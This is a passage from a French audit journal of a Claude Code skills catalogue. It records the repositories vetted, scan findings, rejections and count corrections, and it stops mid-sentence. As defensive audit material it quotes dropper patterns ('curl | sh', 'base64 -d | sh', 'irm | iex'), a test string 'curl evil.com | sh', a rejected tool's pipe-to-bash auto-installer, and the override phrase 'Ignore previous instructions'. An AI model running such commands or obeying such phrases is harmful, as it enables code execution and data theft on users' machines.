# Journal des audits

*Version française uniquement — c'est un registre, pas de la documentation d'usage. Les
décisions qu'il justifie sont dans [`README.fr.md`](README.fr.md) et
[`AGENTS.md`](AGENTS.md).*

Ce fichier garde la trace datée de chaque audit du catalogue : ce qui a été ajouté, ce qui a
été écarté et pourquoi, ce que les scans de sécurité ont réellement montré, et les chiffres
mesurés à chaque fois. Il est en **ajout seul** : on ajoute une entrée, on ne réécrit pas une
ancienne. C'est ce qui permet de recontrôler une affirmation plus tard au lieu de la croire.

Les entrées sont dans l'ordre chronologique.

---

## 2026-09-12 — Audit

aucune collision de nom entre `taste-skill`/`ponytail`/`OmniRoute` et le reste du catalogue. Le seul doublon trouvé est interne à ces trois dépôts (la copie vendée de `ponytail` dans `OmniRoute/skills/ponytail/`) et sans conséquence car `OmniRoute` n'est jamais activé comme plugin de skills. Point de vigilance non bloquant : la philosophie "toujours active" de `ponytail` (solution la plus simple, YAGNI) peut entrer en tension avec le travail structuré spec-kit/superpowers (specs détaillées, architecture, TDD) — à surveiller à l'usage, pas à corriger a priori.

## 2026-09-12 — Sauvegarde

avant de retailler les descriptions des 280 personas copiées dans `white-mirror/.claude/agents/` (frontmatter `description:` ramenée à ~100-140 caractères, une phrase, pour alléger le contexte consommé par la liste d'agents à chaque session), une copie intégrale du dossier a été faite dans `Workspace/stock_agents/` — c'est la version originale (descriptions longues) telle que copiée depuis `mes_depots/agency-agents`. `Workspace/` n'étant pas un dépôt git, cette copie sert de filet de sécurité ; elle n'est pas maintenue à jour et peut être supprimée une fois la réécriture validée.

> *Note du 2026-10-02 :* `Workspace/` est devenu un dépôt git entre-temps, puis a été
> dissous (voir la dernière entrée). `stock_agents/` n'est plus dans l'arbre de travail ; sa
> copie se trouve dans la sauvegarde datée sur le bureau et dans l'historique du dépôt privé
> `claude-code-setup`, archivé. L'entrée ci-dessus est conservée telle qu'écrite.

## 2026-09-14 — Audit

(ajout de `agent-skills` et `code-on-incus`) :
- **`agent-skills` — 1 collision exacte et 8 doublons conceptuels sur 25 skills.** `test-driven-development` porte le même nom que celui de `superpowers` (versions différentes : 16,5 Ko contre 9 Ko). Huit autres recouvrent le stack par défaut : `spec-driven-development` (↔ spec-kit), `interview-me` et `idea-refine` (↔ grill-me/grilling), `code-simplification` (↔ ponytail), `frontend-ui-engineering` (↔ taste-skill), `debugging-and-error-recovery`, `code-review-and-quality`, `planning-and-task-breakdown` (↔ superpowers). **Ces 9 skills sont volontairement écartées.**
- **Les 16 skills restantes ont été versées dans `curation/`** (voir § « Ce que contient curation/ ») : api-and-interface-design, browser-testing-with-devtools, ci-cd-and-automation, constraint-driven-development, context-engineering, deprecation-and-migration, documentation-and-adrs, doubt-driven-development, git-workflow-and-versioning, incremental-implementation, observability-and-instrumentation, performance-optimization, security-and-hardening, shipping-and-launch, source-driven-development, using-agent-skills. Sept d'entre elles pointent vers `../../references/`, d’où la copie du dossier `references/` à la racine de `curation/` : la profondeur relative étant identique, tous les liens résolvent. Aucune collision de nom avec les 16 skills déjà présentes.
- **`code-on-incus` : documenté, non installé.** Linux uniquement, et architecturalement il enveloppe Claude Code de l'extérieur (`coi shell` puis lancement de l'agent dedans) — ce n'est pas un mécanisme invocable au moment de déléguer à un sous-agent, ceux-ci s'exécutant dans la session de l'agent principal.
- **Réorganisation du 2026-09-14 (suite)** : ces 16 skills, ainsi que `grill-me`/`grilling`, ont d’abord été copiées dans `mes_depots/superpowers`, puis sorties dans `curation/` lors de la mise sous git du Workspace. `superpowers` est redevenu vierge (0 modification locale), et la dette de maintenance liée à ces copies a disparu : `curation/` est versionné.

## 2026-09-23 — Audit

(ajout de 7 dépôts et scan de sécurité intégral) :
- **Scan Skillspector sur la totalité du catalogue** : 2790 `SKILL.md` dans `mes_depots/` plus 18 dans `curation/`. **Aucun code malveillant trouvé.** Le rapport brut annonce pourtant 4969 findings dont 157 CRITICAL — il est inexploitable tel quel.
- **Comment lire un rapport Skillspector.** 71 % des findings portent sur des fichiers markdown, pas sur du code. Les skills **officielles Anthropic** (`docx`, `xlsx`, `pptx`, `skill-creator`, `mcp-builder`, `claude-api`) sortent toutes à 100/100 « DO NOT INSTALL » ; une injection de prompt est détectée dans `opc-contentTypes.xsd`, un schéma de la norme ECMA Office. `superpowers/writing-skills` atteint 100/100 parce que les mots « Write skill » dans un tableau markdown déclenchent le motif « Self-Modification ». Notre `security-and-hardening` sort à 76/100 pour SSRF parce qu'il contient `169.254.169.254` — l'adresse qu'il apprend à **bloquer** ; `browser-testing-with-devtools` à 65/100 pour « Ignore previous instructions », l'attaque qu'il apprend à **tester**. `graphify` à 100/100 parce que ses regex `id_rsa`/`.netrc` sont les signatures de son détecteur de secrets. **Règle : ne lire que les findings situés dans des fichiers exécutables (`.py`, `.sh`, `.js`, `.ts`…), ignorer ceux des `.md`.**
- **Contre-vérification indépendante du scanner** : extraction manuelle de tous les domaines sortants des scripts des nouveaux dépôts (uniquement `schemas.openxmlformats.org`, `example.com`, `fal.ai`, `github.com`, `w3.org`) et recherche de motifs de dropper (`curl | sh`, `base64 -d | sh`, `eval` sur réponse réseau) : une seule occurrence, l'installeur documenté de VoiceStudio depuis son propre domaine. Rien de suspect.
- **Réserve de couverture** : 1517 skills marquées « incomplete », 459 fichiers partiellement inspectés et 165 jamais inspectés (plafond de 1 Mo par fichier). La couverture n'est pas totale.
- **Skillspector n'est pas câblé comme garde-barrière automatique** au démarrage d'un projet : avec ce taux de faux positifs il bloquerait des skills officielles Anthropic. Usage ponctuel et manuel uniquement.
- **65 skills d'ECC versées dans `curation/`** (voir § « Création d'applications »). Sélection fermée sous ses références croisées ; les 18 liens relatifs résolvent tous. Trois liens pointant vers des skills écartées ont été réparés dans nos copies (`react-patterns` et `react-performance` renvoyaient à `frontend-patterns`, `react-testing` à `tdd-workflow` — désormais redirigé vers `test-driven-development` du plugin superpowers).
- **Skills écartées pour chevauchement de déclencheur** : `frontend-patterns` (↔ `react-patterns` + `react-performance`), `frontend-a11y` (↔ `accessibility`), `browser-qa` (↔ `browser-testing-with-devtools` déjà présent), plus `api-design`, `architecture-decision-records`, `git-workflow`, `tdd-workflow`, `security-review`, `security-scan`, `taste*` et `frontend-design-direction`, tous en doublon conceptuel avec le stack existant.
- **Aucune collision de nom** entre les 65 nouvelles skills et les 18 existantes, `superpowers`, `taste-skill` ou `ponytail`. Vérifié aussi au niveau du `name:` de frontmatter : 83 skills, 83 noms distincts, toutes pourvues d'une `description:`.
- **`mes_depots/` change de rôle** : ce n'est plus seulement la matière première de la curation, c'est aussi le stock d'outils pour les applications à construire. VoiceStudio, voicebox et SCAIL-2 y sont conservés à ce titre, sans aucun `SKILL.md` exploitable.
- **Volume** : `mes_depots/` passe à ~1,7 Go pour 21 dépôts. `curation/` passe de 29 à 253 fichiers.

## 2026-10-02 — Audit

(épinglage des dépôts amont, Jev remplacé par Laya) :
- **Chaque dépôt amont est désormais épinglé.** `skills-unified/catalog/repos.tsv` gagne deux colonnes, `commit` et `scanned`. Les 22 lignes portent un SHA 40-hex vérifié et la date `2026-10-02`. Le problème qu'on corrige : `SETUP.md` clonait la pointe de branche alors que le scan de sécurité portait sur un état passé — ce qu'un utilisateur installait n'était donc pas ce qui avait été vérifié. Procédure de clonage épinglé testée sur `taste-skill` et `ponytail`, les deux atterrissent exactement sur le SHA attendu.
- **Rescan complet aux commits épinglés.** La méthode manuelle (extraction des domaines sortants, motifs `curl | sh`, `base64 -d | sh`, `eval` sur réponse réseau, `Invoke-Expression` sur requête web, `pickle.loads` sur réponse réseau) a tourné sur les 22 dépôts ; Skillspector v2.11.2 sur les 12 qui apportent du contenu dans un projet. **Aucun code malveillant.** Chaque occurrence relève d'un de ces quatre cas : fixture de test d'un détecteur, installeur documenté d'un projet depuis son propre domaine, installeur amont officiel cité dans un script de build, ou faux positif de regex (`ECC/scripts/build-pi-core.js` matche sur ses *propres* chaînes de liste noire `"curl|sh"` ; `VoiceStudio/electron/src/main/updater.ts:70` matche `exec(await response.text())`, qui est `RegExp.prototype.exec` sur un flux YAML de version).
- **La grille de lecture de 2026-09-23 tient sans exception.** 11 des 12 dépôts scannés sortent à 100/100 « DO NOT INSTALL », dont `claude-code-security-review` — l'outil de sécurité d'Anthropic, signalé CRITICAL pour les appels `requests.get` à l'API GitHub qui sont sa raison d'être — et `taste-skill`, qui compte 5 fichiers exécutables et **zéro** finding dedans. Les dix findings exécutables d'`anthropics-skills` sont tous dans des skills officielles : `os.environ.copy()` dans le `soffice.py` de `docx`/`pptx`/`xlsx` lu comme « Data Exfiltration », la chaîne littérale `~/.ssh/id_rsa` dans un échafaudage d'évals `claude-api` comme « Privilege Escalation ». Le seul score sous 100 du lot est `andrej-karpathy-skills` à 33 « CAUTION », et uniquement parce qu'il ne contient aucun fichier exécutable.
- **Un seul fichier exécutable dans tout `curation/`.** `curation/` ne contient **qu'un seul** fichier exécutable sur ses 254 fichiers : `skills/ios-icon-gen/scripts/iconify_gen.sh`, relu ligne à ligne — `set -euo pipefail`, un seul domaine sortant (`api.iconify.design`), les SVG téléchargés vers des fichiers avec `curl --fail -o` et jamais tubés vers un shell, aucun `eval` ni `base64 -d`. Tout le reste est du Markdown. ⚠️ Un premier comptage avait annoncé zéro : il reposait sur un `find curation -type f` lancé depuis `skills-unified/`, où `curation` est une **jonction** que `find` ne traverse pas sans `-L`. Le vrai chiffre est 1, obtenu en parcourant le dossier réel. Et zéro finding HIGH ou CRITICAL dans un fichier exécutable à l'intérieur des 65 skills d'ECC, 16 d'`agent-skills` ou 2 de `mattpocock` qu'on redistribue — vérifié en croisant les chemins des findings avec la liste d'`ATTRIBUTION.md`.
- **`jev-mcp` retiré, remplacé par `laya`.** Il était payant à l'appel. Laya (Apache 2.0, confirmée depuis son `LICENSE` et depuis PyPI) répond à la même forme de question et tourne en local, sans clé API. Son serveur MCP vient de **son propre dépôt** — aucun wrapper tiers. Scanné propre au commit `4aa6761`. `structured-decisions` est devenue neutre vis-à-vis des fournisseurs.
- **Chiffres recomptés sur les fichiers réels**, plusieurs avaient dérivé : 83 → **84 skills** (`structured-decisions` était dans l'arbre mais dans aucun cheatsheet), 65 → **66** pour la famille applicative, 21 → **22** rulesets, 21 → **22** lignes au catalogue, 227/292 → **228/293** pour ECC qui a gagné une skill depuis. Le chiffre de « 2808 fichiers de skills » n'a pu être reproduit à aucun commit épinglé : le vrai total sur les 22 clones est **2920**, et il est désormais énoncé contre l'épinglage pour être recontrôlable.
- **Veille automatisée.** `skills-unified/.github/workflows/upstream-watch.yml`, mensuelle et déclenchable à la main, compare chaque épinglage à la pointe de sa branche et tient une issue unique avec les liens de comparaison. Permissions minimales (`contents: read`, `issues: write`), aucun clonage (`git ls-remote <url> HEAD`, ce qui gère les branches par défaut qui ne s'appellent pas `main` : `SCAIL-2` est sur `wan-scail2`, `OmniRoute` sur `release/v3.8.52`, `graphify` sur `v8`). Elle signale, elle ne change rien.
- **Recoupements d'auto-invocation relevés, volontairement non résolus** (les résoudre voudrait dire modifier un dépôt de `mes_depots/`, ce que la méthode interdit) : `superpowers:test-driven-development` face aux skills de test par langage, `superpowers:using-superpowers` face à `using-agent-skills` (quasi-doublon), `superpowers:brainstorming` — dont la description commence par « You MUST use this before any creative work » — face à `grill-me` et à l'étape `specify` de spec-kit, et `taste-skill:high-end-visual-design` face à `make-interfaces-feel-better`. Liste complète dans la PR #1 du miroir public.
- **Cache local réaligné le même jour.** Les 21 clones de `mes_depots/` ont été amenés au commit épinglé par `git fetch --depth 1 origin <sha>` puis `git checkout --force FETCH_HEAD`, dans le dossier existant plutôt que par suppression/reclonage. Avant : 6 dépôts sur 21 au bon SHA. Après : 21 sur 21, vérifiés par `rev-parse HEAD`. Vingt des 21 sont vierges de toute modification locale ; `Anthropic-Cybersecurity-Skills` a un `SKILL.md` supprimé dans son arbre de travail, laissé en place faute de savoir si c'était volontaire. Recomptages consécutifs : `superpowers` passe de 14 à 15 skills, `agency-agents` de 294 à 297 personas, `ECC/skills` de 292 à 293.
- **Personas : un noyau de 14 par défaut, le reste par division (PR #2).** `agency-agents` était en activation `default` : le dépôt public faisait cloner ses 7,5 Mo puis disait de les lier comme un plugin de skills — or il n'a ni `plugin.json` ni dossier `skills/`, donc le lien ne pouvait rien produire, et la vraie procédure de copie n'existait que dans ce `CLAUDE.md` privé. Passé en activation `core-set`, avec une étape 4b dans `SETUP.md`. Un noyau de 14 est copié d'office — architecture, backend, frontend, revue, base de données, devops, prototypage, UI, UX, tests, accessibilité, appsec, rédaction technique — pour ~600 tokens par session mesurés, et le reste se demande par division. Les 297 coûteraient ~15 800 tokens à chaque session pour trois ou quatre utilisées. Dans le même mouvement : le seuil des 80 fichiers de graphify devient actionnable (une commande de comptage à lancer avant tout changement structurel, au lieu d'une ligne que personne ne relit), et l'offre de Laya devient obligatoire et chiffrée (torch ~1 Go, checkpoint 322–421 M paramètres au premier appel) plutôt que silencieusement passable.
- **Chiffres désormais vérifiés par un script (PR #2).** `skills-unified/scripts/check.py` (bibliothèque standard, ~1 s, en CI sur chaque push) recompte les skills, les familles, chaque catégorie des deux cheatsheets, le frontmatter de chaque skill, les rulesets, l'arité et le format de `repos.tsv`, tous les liens relatifs et ancres, l'accord anglais/français, et la liste nominative des fichiers exécutables livrés. C'est ce qui manquait : les chiffres avaient dérivé parce que rien ne les recomptait. Prouvé en cassant le dépôt sept fois exprès.
- **Détail complet** : https://github.com/MoradDev/skills-unified/pull/1 et https://github.com/MoradDev/skills-unified/pull/2

## 2026-10-02 — Consolidation : un seul dépôt

Le workspace et ce dépôt faisaient la même chose, et ça coûtait à chaque modification.

**Le constat.** Les 254 fichiers de `curation/` étaient versionnés dans **deux** dépôts git :
`claude-code-setup` (privé) et `skills-unified` (public), avec la même liste et la même
empreinte. `Workspace/curation` était le vrai dossier, `skills-unified/curation` une jonction
pointant dedans. Toute modification demandait deux commits — constaté le jour même sur
`structured-decisions`. La documentation doublait aussi : 350 lignes de `Workspace/README.md`
recouvraient `README.fr.md` + `CHEATSHEET.fr.md` + `AGENTS.md`, et la même modification a dû
être écrite deux à quatre fois pendant toute la session (Laya, épinglage, personas, noyau
de 14). La règle « mets à jour les deux ensemble » n'était pas une discipline mais une taxe.

**L'argument décisif :** `SETUP.md` dit déjà que « la racine du dépôt **est** la racine du
workspace ». `Workspace/` était une coquille extérieure qui réimplémentait ce dépôt.

**Ce qui a été fait**, dans cet ordre, avec vérification entre chaque étape :

1. Sauvegarde datée de `curation/` et `stock_agents/` sur le bureau, contrôlée par empreinte
   SHA-256 normalisée (fins de ligne ignorées) : identique au bit près.
2. `skills-unified/` déplacé à la racine du bureau.
3. `curation/` est devenu un **vrai dossier** au lieu d'une jonction. Fait en renommant
   d'abord le lien, en copiant le contenu réel, en vérifiant l'empreinte, puis en supprimant le
   lien avec `rmdir` **sans `/s`** — `Remove-Item -Recurse` sur une jonction Windows efface sa
   cible, c'est le piège classique. Cible vérifiée intacte avant et après.
4. `mes_depots/` (21 clones) et le projet `prompt-eng-interactive-tutorial` déplacés dans la
   nouvelle racine. Les 21 clones sont toujours à leur SHA épinglé, vérifié.
5. `scripts/check.py` cherche désormais `mes_depots/` dans la racine du dépôt **ou** à côté,
   pour que les deux dispositions fonctionnent. 30 contrôles, 0 échec.
6. Historique d'audit sorti de `Workspace/README.md` vers ce fichier, et procédure propre à la
   machine vers `~/.claude/CLAUDE.md`.
7. `claude-code-setup` **archivé**, pas supprimé : c'était la seule copie de `stock_agents`.
   Archiver est réversible.

**Ce qui disparaît avec la fusion**, et c'est le gain : la double écriture de `curation/`, la
règle de synchronisation des deux documentations, et la section « miroir public » — il n'y a
plus de miroir, il n'y a qu'un dépôt.

## 2026-10-03 — Vérification d'intégrité et de cohérence

**Intégrité, sans écart dans le dépôt.** `git fsck --full` propre ; `main` local et distant
identiques (`5534e6e`) ; `check.py` 30/30 ; CI verte sur les cinq derniers passages.

**Cache `mes_depots/`, comparé ligne à ligne à `catalog/repos.tsv`** (`HEAD`, URL d'origine,
`git status --porcelain` pour chaque clone) : 20 des 22 à leur SHA épinglé, propres.
Deux écarts, laissés tels quels :
- `Anthropic-Cybersecurity-Skills` : un fichier absent de l'arbre de travail,
  `skills/detecting-fileless-malware-techniques/SKILL.md`. `Get-MpThreatDetection` montre que
  Defender a mis ce même fichier en quarantaine le 02/10 dans un autre clone : c'est
  l'antivirus, pas une modification. Un `git checkout` serait de nouveau effacé ; la décision
  d'une exclusion revient à l'humain.
- `laya` non cloné. Activation `opt-in`, cache reconstructible : pas une erreur.

**Cohérence, deux contradictions que `check.py` ne pouvait pas voir**, parce que chaque
nombre était juste et que seule leur somme était fausse :
1. Les deux README créditaient 65 + 16 + 2 = 83 skills et affirmaient qu'aucune n'avait été
   écrite ici, alors que le disque en compte 84 et qu'`ATTRIBUTION.md` déclare
   `structured-decisions` originale. Corrigé dans les deux README. **Nouveau contrôle**
   `check_provenance` : chaque skill du disque attribuée une seule fois dans
   `ATTRIBUTION.md`, chaque titre de section égal au nombre de noms listés, et les deux README
   créditant les mêmes nombres et nommant chaque skill originale. Vérifié en remettant les
   anciens README : 2 échecs, comme attendu. 38 contrôles, 0 échec.
2. L'enchaînement spec-kit s'arrêtait à `implement` dans les README et dans `AGENTS.md`, sans
   la boucle `converge` que les `CHEATSHEET`, `SETUP.md` et le `QUICKSTART` décrivent — et que
   le `spec-kit` épinglé fournit bien (`templates/commands/converge.md`). Ajoutée.

**Accord EN/FR des README** : relus en entier côte à côte, et contre-vérifiés par une
comparaison Jev (`jev_compare`, six aspects — nombres de skills, rejets, chiffres du scan,
personas, provenance, procédure d'épinglage) : `same_fact` sur les six, confiance 1,0. Jev
reste retiré du dépôt (voir l'entrée du 2026-10-02) ; l'appel a été fait à la demande, depuis
la session.

**Rangement** : les branches `maintenance/pinning-and-laya` et
`maintenance/onboarding-and-checks` sont toutes deux ancêtres de `main`
(`git merge-base --is-ancestor`), donc supprimables sans perte. Supprimées du distant par
l'humain le même jour.

## 2026-10-04 — Audit : trois ajouts, deux rejets, une liste de harnais

Candidats tirés des dépôts étoilés de l'humain (65), triés sur leur fiche GitHub puis audités.
Méthode, pour chacun : clone au commit noté ci-dessous, lecture du code exécutable, extraction
des domaines sortants, recherche des motifs `curl | sh`, `irm | iex`, `base64 -d | sh`, `eval`
sur réponse réseau, puis Skillspector v2.11.2 en statique (`--no-llm`) — findings sur `.md`
ignorés, selon la règle du 2026-09-23.

**Ajoutés au catalogue (25 lignes) :**
- `humanizer` (`skills`, `on-demand`, `225a6f3`, MIT) — 1 skill, réécrit la prose qui sent
  l'IA. Seul exécutable : un validateur de paquet local, sans réseau. Skillspector 49/100,
  7 findings, tous sur `.md`. Recoupement avec `anthropics-skills/doc-coauthoring` écarté par
  Jev (`jev_compare`, `different_facts`, confiance 0,89 et 0,93 sur les deux aspects
  « tâche » et « requête déclenchante »). Aucun recoupement dans `curation/`.
- `i-have-adhd` (`skills`, `on-demand`, `839872f`, MIT) — mise en forme des réponses, la
  réponse d'abord. `disable-model-invocation: true` : invocation manuelle seulement, donc
  aucune concurrence de déclenchement. Le plugin apporte un hook `SessionStart` (Node, repli
  sh/ps1), lu en entier : inerte sans le fichier `~/.claude/.i-have-adhd-always`, local, sans
  réseau. Skillspector 100/100 ; ses 7 findings HIGH sur exécutables relus un par un, tous
  faux positifs (dont une « exfiltration » qui est un environnement de test **retirant** les
  clés d'API).
- `claude-quickstarts` (`app-tool`, `stock`, `3994db7`, MIT, Anthropic) — même rôle que
  VoiceStudio/voicebox/SCAIL-2, pour une application qui appelle l'API Claude ; le `stock` n'a
  pas été élargi. Domaines : Anthropic, SEC, Linear, Slack, Sentry, Archil, tous attendus.
  Skillspector 100/100 ; ses 2 CRITICAL sont une démo qui lit l'API publique de la SEC.
  **Couverture Skillspector : 0 %** (plafond de temps atteint) ; la passe manuelle domaines et
  motifs a couvert ses 626 fichiers, mais les scripts de démo n'ont pas été relus ligne à
  ligne.

**Rejetés :**
- `cloudflare/computer` (`2f76387`) — un système de fichiers virtuel dans un Durable Object,
  marqué « PREVIEW ONLY, NOT suitable for production » par son propre README. Ne comble pas
  l'absence de bac à sable hors Linux que laisse `code-on-incus`.
- `iOfficeAI/OfficeCLI` (`b590a43`) — doublon de `docx`/`xlsx`/`pptx` d'`anthropics-skills`,
  et surtout : `open()`/`create()` de ses SDK ont `autoInstall = true` par défaut, contrairement
  à leur propre commentaire, et lancent `(curl d.officecli.ai || curl github) | bash` ou
  `irm … | iex` — miroir tiers en premier. La somme de contrôle est sautée si `SHA256SUMS`
  manque, et elle vient du même miroir. Les findings « analysis-evasion » sont des octets NUL
  servant de séparateurs dans des littéraux C#, inoffensifs.

**Chiffre corrigé : 2920 → 2921 fichiers `SKILL.md` aux 22 commits épinglés.** Le 2920 du
2026-10-02 a été compté sur l'arbre de travail au moment où Defender venait de mettre en
quarantaine `Anthropic-Cybersecurity-Skills/skills/detecting-fileless-malware-techniques/SKILL.md`
(voir l'entrée du 2026-10-03). Recompté sur l'arbre git (`git ls-tree -r HEAD`, nom exact
`SKILL.md`) : 2921 ; sur le disque : 2920, l'écart est ce fichier. Avec les trois ajouts
(1 + 2 + 3) : **2927**. `claude-quickstarts` contient en plus 8 `skill.md` en minuscules, non
comptés, comme le veut la méthode.

`laya` recloné à son commit épinglé : le cache compte de nouveau toutes les lignes du catalogue.

**Harnais, listés dans les README sans entrer au catalogue** (Open Interpreter, OpenClaw,
Hermes Agent, Pi, Omnigent, Ruflo, DeepSeek Harness, supercli). Décision de l'humain, sur cette
recommandation : un harnais exécute des commandes sur la machine, un audit sommaire ne peut pas
s'en porter garant, et une date `scanned` l'aurait prétendu ; un épinglage ne correspond pas à
ce qu'on installe depuis npm ou pip ; et ces dépôts bougeant chaque jour, `upstream-watch` en
aurait signalé onze chaque mois. Ce que la liste dit de chacun vient de son propre README, rien
d'autre. Écartés de la liste : `kimi-cli` (archivé), `openfox` (sans licence), `openclaude`
(licence non identifiable).

## 2026-10-04 — `humanizer` passe en activation `default`

**Décision de l'humain** : `humanizer` rejoint le plancher raccordé à chaque nouveau projet, aux
côtés de `superpowers`, `taste-skill` et `ponytail`. Audité le même jour (entrée précédente) au
commit `225a6f3`, inchangé.

Ce qui le rend possible : c'est un plugin de skills, avec son propre
`.claude-plugin/plugin.json` (`"skills": ["./"]`), donc il se lie exactement comme les trois
autres — `check.py` le vérifie désormais pour les quatre.

Ce que ça coûte : sa `description` (environ 430 caractères, soit de l'ordre de 100 tokens —
estimé, pas mesuré) est chargée à chaque session ; le corps de la skill (32 Ko) ne l'est que
lorsqu'elle se déclenche. Aucun hook, aucun script exécuté à l'usage.

Recoupements : aucun avec les 84 skills de `curation/` ni avec les trois autres dépôts par
défaut, à la lecture de leurs `description`. Le plus proche, `doc-coauthoring`
(`anthropics-skills`, `on-demand`), a été écarté par Jev (voir l'entrée précédente). Rien
n'est donc ajouté à `AGENTS.md` § « When two skills compete ».

À savoir à l'usage : sans échantillon d'écriture de l'humain, sa règle §8 retire tous les
tirets cadratins de la prose qu'il réécrit.

Mis à jour : `catalog/repos.tsv`, `scripts/check.py` (liste des lignes `default`), les deux
README (titre et puce), `SETUP.md` (étapes 2 et 4), les deux `QUICKSTART`, les deux
`CHEATSHEET` (nouvelle section 8, les suivantes renumérotées) et `ATTRIBUTION.md`.
39 contrôles, 0 échec.

## 2026-10-11 — Audit : `rtk` ajouté en `manual`, `impeccable` et `hyperframes` écartés

Candidats tirés des dix étoiles ajoutées par l'humain entre le 2026-10-05 et le 2026-10-11, triés
sur leur fiche GitHub ; trois audités à la demande. Méthode : clone au commit noté, lecture des
manifestes, des hooks et du code exécutable qu'une installation lance, domaines sortants et motifs
`curl | sh`, `irm | iex`, `base64 -d | sh`, `eval` sur réponse réseau. Skillspector **non lancé** :
sur des dépôts de cette taille (8 à 105 Mo) il a plafonné à 0 % de couverture le 2026-10-04, la
lecture manuelle porte seule l'audit. Tri des recoupements de descriptions par Laya
(`laya_predict_batch`, `noul`, `min_confidence=0.75`), Jev en second avis sur les seuls cas sous
le seuil, l'humain si les deux le sont — conformément aux règles de l'humain.

**Ajouté : `rtk`** (`tool`, `manual`, `a4cddfc`, Apache-2.0, Patrick Szymkowiak) — un binaire Rust
qui se place devant les commandes shell et en réduit la sortie avant que l'agent la lise.
- Son `install.sh` télécharge la **dernière** release, avec vérification de somme de contrôle qui
  refuse en cas d'échec (sauf `RTK_SKIP_CHECKSUM=1`). Ce n'est pas l'état inspecté : `SETUP.md`
  documente donc `cargo install --git … --rev a4cddfc`, qui compile le commit audité (Rust 1.91+).
- Télémétrie : URL compilée seulement dans les builds de release, **consentement explicite exigé**
  avant tout envoi (commentaire « RGPD » dans `src/core/telemetry.rs`), `RTK_TELEMETRY_DISABLED=1`
  pour la couper. Seule crate réseau : `ureq`, appelée uniquement par la télémétrie.
- `rtk init -g` est **global** : `~/.claude/RTK.md`, `@RTK.md` ajouté à `~/.claude/CLAUDE.md`, et un
  hook dans les réglages utilisateur qui réécrit toutes les commandes shell de tous les projets.
  `rtk init` sans `-g` n'installe aucun hook (lu dans `src/hooks/init/claude.rs`,
  `run_default_mode`) : un bloc dans le `CLAUDE.md` du projet et un modèle de filtres. Les deux
  acceptent `--dry-run` et `--uninstall`. D'où `manual` : l'humain l'installe, jamais l'agent, et
  jamais à la racine du workspace.
- Motifs de dropper : l'installeur documenté du projet, depuis son propre dépôt ; une chaîne
  `curl evil.com | sh` dans un test de `src/hooks/integrity.rs`. Rien d'autre.
- Les 12 `SKILL.md` de son `.claude/skills/` servent au développement de `rtk` lui-même : comptés
  dans le total, jamais liés.

**Écartés, décision de l'humain sur ces constats :**
- `impeccable` (`c63b8dd`, Apache-2.0) — une skill de qualité, mais ce qui tourne est un binaire
  précompilé (`engine-v0.1.14`) téléchargé depuis les releases du projet (somme vérifiée, refus en
  cas d'échec), pas la source inspectée ; installé par sa marketplace, ses hooks le lancent à chaque
  `Edit`/`Write` et à chaque fin de tour. Et il entre en concurrence avec le socle par défaut :
  Jev retient une concurrence avec `taste-skill` (0,82) et `redesign-skill` (0,84) après abstention
  de Laya ; `soft-skill` resté indécis des deux côtés (Laya 0,60, Jev 0,45). Laya écarte, au-dessus
  du seuil, une concurrence avec `make-interfaces-feel-better` (0,83), `design-system` (0,79) et
  `accessibility` (0,82) — retenu selon la règle, contre la lecture de l'agent, qui voyait un
  recoupement : un cas à garder pour calibrer le seuil. Les domaines publicitaires trouvés dans son
  code (`googletagmanager`, `connect.facebook.net`) sont des données de test du code Rust.
- `hyperframes` (`d4dd6c0`, Apache-2.0, HeyGen) — ses skills lancent `npx hyperframes` (156 fois,
  dont 2 fois `@latest`) : le code exécuté est toujours la dernière version npm, l'épinglage n'y
  protège rien. Télémétrie PostHog **active par défaut** (`HYPERFRAMES_NO_TELEMETRY=1` ou
  `DO_NOT_TRACK=1` pour la couper). 21 skills, environ 2 700 tokens de descriptions par session.
  Recoupements indécis des deux côtés : avec `ui-demo` (Laya 0,74, Jev 0,62) et `slideshow` avec
  `pptx` (Laya 0,72, Jev 0,59) ; `motion-graphics` sans concurrence avec `motion-foundations`
  (Laya 0,88). Hors du `stock`, réservé aux briques d'IA. Note : son arborescence dépasse la limite
  de 260 caractères des chemins Windows dans un dossier profond ; `core.longpaths` était nécessaire.

**Chiffres** : 26 lignes au catalogue ; fichiers `SKILL.md` aux commits épinglés, même méthode
(`git ls-tree`, nom exact) : 2927 + 12 = **2939**. 39 contrôles, 0 échec.

## 2026-10-11 — `scripts/scan.py`, et correction de la lecture du « 0 % »

**Correction des entrées du 2026-10-04 et du 2026-10-11 (ci-dessus).** Elles disent que
Skillspector a « plafonné à 0 % de couverture » et l'interprètent comme « presque rien
inspecté ». C'est faux. Relu dans les rapports : sur `claude-quickstarts`, 623 fichiers
*partiellement* inspectés, aucun ignoré ; la cause est **7 fichiers** — quatre fichiers de
verrouillage lus comme « obfusqués », deux `requirements.txt` au-delà du plafond de 5 s de
l'analyse des dépendances, un `docker-compose.yml` au plafond de sortie — qui dégradent des
analyseurs entiers, d'où chaque fichier compté partiel. Sur `cloudflare/computer`, l'erreur était
la nôtre : `--recursive` ne cherche un `SKILL.md` qu'un niveau plus bas, et ce dépôt n'en a pas à
ce niveau ; il n'a quasiment rien scanné. Seul OfficeCLI butait sur une vraie limite de taille
(920 binaires et archives, 294 fichiers non inspectés). Les décisions de ces entrées tiennent :
aucune ne reposait sur la couverture de Skillspector.

**Ajout : `scripts/scan.py`**, bibliothèque standard seulement, sans modification de
Skillspector. Il découpe un dépôt en une unité par dossier de skill plus une pour les
exécutables et manifestes hors skills, écarte fichiers de verrouillage, binaires et fichiers de
plus de 1 Mo en listant chacun, copie chaque unité sous un chemin court (limite Windows de
260 caractères), lance `skillspector scan --no-llm` et fusionne les rapports sur les chemins du
dépôt, triés pour la lecture. Il ne tranche rien et sort toujours en 0. Laya n'y est pas branché :
décision de l'humain, sur le constat qu'un tri automatique ne doit jamais pouvoir écarter un
résultat. **Un appel réseau subsiste** : l'analyse des dépendances de Skillspector envoie les noms
et versions de paquets à `api.osv.dev` (`nodes/analyzers/osv_client.py`), même en `--no-llm` ;
aucun contenu de fichier. Gardé, car c'est lui qui trouve les dépendances vulnérables.

**Mesures :**
- `claude-quickstarts` : 86 % inspectés entièrement (310 sur 361), contre 0 % le 2026-10-04. Pas
  le même ensemble : le script ne remet que skills, exécutables et manifestes (361 fichiers), pas
  la prose hors skills (623 auparavant).
- `rtk` : 87 % (208 sur 239), 13 unités, rien d'écarté. Premier scan Skillspector de `rtk` ; il
  n'avait pas été lancé à son ajout plus haut dans la journée.

**`rtk`, lecture des résultats** : 279 HIGH, 279 MEDIUM, 5 LOW sur exécutables, 22 sur la prose
